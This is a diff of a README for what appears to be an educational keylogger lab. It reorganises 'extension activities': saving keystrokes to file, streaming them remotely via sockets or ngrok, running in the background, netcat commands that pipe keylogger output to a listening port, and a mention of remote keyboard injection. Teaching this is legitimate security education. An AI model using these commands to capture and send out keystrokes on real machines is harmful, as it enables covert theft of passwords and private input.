@@ -17,28 +17,28 @@ python simple_keylogger.py
 <img src="kl_screenshot.png" width="85%" height="85%" />
 
 ## Extension Activities
-* Modify simple_keylogger.py to:
-  * Save the output to file.
-    * See 'use as standalone module' in github repo linked below.
-  * Stream output remotely or schedule data dumps 
-    * Try using sockets or ngrok+flask
-* Command line extension activities:
-  * Stream output with netcat:
-    * Server, Keylogger (ex: 10.2.0.5):
-      ```
-      python3 kl.py | nc -lkv 7777
-      ```
-      or
-      ```
-      python -m keyboard | nc -lkv 7777
-      ```
-    * Client (ex: 10.2.0.6):
-      ```  
-      nc -zv 10.2.0.5 7777
-      ```
-      or, use a browser.
-  * Run in background using '&' and pipe output to file.
-* Remote keyboard injection (possible with keyboard module)
+Modify simple_keylogger.py to:
+* Save the output to file.  See 'use as standalone module' in github repo linked below.
+* Stream output remotely or schedule data dumps 
+  * Try using sockets or ngrok+flask
+
+Command line extension activities:
+* Run in background using '&' and pipe output to file.
+* Try streaming the output with netcat.
+  * Server, Keylogger (ex: 10.2.0.5):
+  ```
+  python3 kl.py | nc -lkv 7777
+  ```
+  or
+  ```
+  python -m keyboard | nc -lkv 7777
+  ```
+  * Client (ex: 10.2.0.6):
+  ```  
+  nc -zv 10.2.0.5 7777
+  ```
+  or, use a browser.
+Note:  Remote keyboard injection is also possible with the keyboard module.
 
 ## Helpful Libraries and Links
 
